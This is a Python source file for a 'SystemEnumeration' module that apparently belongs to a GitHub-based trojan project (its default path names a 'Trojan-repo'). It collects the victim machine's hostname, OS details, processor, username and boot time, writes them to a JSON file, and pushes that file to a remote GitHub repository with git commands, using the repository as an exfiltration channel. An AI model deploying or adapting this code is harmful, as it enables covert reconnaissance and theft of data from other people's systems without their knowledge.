import socket
import platform
import psutil
from datetime import datetime
import os
import json
import subprocess

class SystemEnumeration:
    def __init__(self, repo_path="https://raw.githubusercontent.com/BlertaJashanica/Trojan-repo/main/data/"):
        self.repo_path = repo_path  # Path to the cloned GitHub repository

    def gather_info(self):
        """
        Collects basic system information such as OS details, users, and running processes.
        """
        info = {
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "architecture": platform.architecture(),
            "processor": platform.processor(),
            "username": os.environ.get("USER") or os.environ.get("USERNAME") or "Unknown",
            "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S"),
            # Uncomment the following line to include running processes if needed
            # "running_processes": [p.info for p in psutil.process_iter(attrs=['pid', 'name'])]
        }
        return info

    def write_results(self, file_name="system_enumeration.txt"):
        """Write system information to a file in the cloned repository."""
        system_info = self.gather_info()
        with open(f"{self.repo_path}/{file_name}", "w") as file:
            json.dump(system_info, file, indent=4)
        print(f"System information has been written to {file_name}")

    def push_to_github(self, file_name="system_enumeration.txt"):
        """Pushes the file to the GitHub repository."""
        try:
            subprocess.run(["git", "-C", self.repo_path, "add", file_name], check=True)
            subprocess.run(["git", "-C", self.repo_path, "commit", "-m", "Update system enumeration file"], check=True)
            subprocess.run(["git", "-C", self.repo_path, "push"], check=True)
            print(f"{file_name} pushed to GitHub repository.")
        except subprocess.CalledProcessError as e:
            self.log_error(f"Git operation failed: {e}")
        except Exception as e:
            self.log_error(f"Unexpected error during Git operation: {e}")

    @staticmethod
    def log_error(message):
        """Logs errors to a dedicated error file."""
        with open("error_log.txt", "a") as error_file:
            error_file.write(f"{datetime.now()}: {message}\n")


# Example Usage
if __name__ == "__main__":
    # Path to your local cloned GitHub repository
    repo_path = "./data"  # Replace this with your local repository path
    system_enumeration_tool = SystemEnumeration(repo_path=repo_path)

    # Write results to 'system_enumeration.txt'
    system_enumeration_tool.write_results()

    # Push the file to GitHub
    system_enumeration_tool.push_to_github()
